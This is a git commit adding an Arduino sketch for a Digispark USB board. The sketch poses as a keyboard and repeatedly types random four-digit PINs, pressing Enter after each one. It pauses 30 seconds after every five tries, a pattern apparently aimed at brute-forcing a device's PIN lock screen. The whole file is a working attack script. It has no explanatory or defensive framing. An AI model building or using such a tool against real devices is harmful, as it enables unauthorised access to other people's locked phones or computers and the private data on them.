dac002f7bcf1d8e861d157c2a24d722a9dce6cd3
M S ARUN SANJEEV <142534017+msarunsanjeev@users.noreply.github.com>
2023-10-19 22:23:45 +0530

    Add files via upload

---
+++ 4 Digit Pin.ino
@@ -0,0 +1,28 @@
+
+#include <DigiKeyboard.h>
+
+void setup() {
+  DigiKeyboard.delay(500);
+  DigiKeyboard.sendKeyStroke(0); 
+}
+
+void loop() {
+  static int attempts = 0;
+
+  while (attempts < 5) {
+    randomSeed(millis());
+    char pinStr[5]; 
+    for (int i = 0; i < 4; i++) {
+      pinStr[i] = random(10) + '0'; 
+    }
+    pinStr[4] = '\0'; // Null terminator
+    DigiKeyboard.print(pinStr); 
+    DigiKeyboard.sendKeyStroke(KEY_ENTER); 
+    DigiKeyboard.delay(2000); 
+    attempts++;
+  }
+
+  attempts = 0; // Reset attempts counter
+  DigiKeyboard.delay(30000); // Delay 30 seconds before the next 5 attempts
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+}
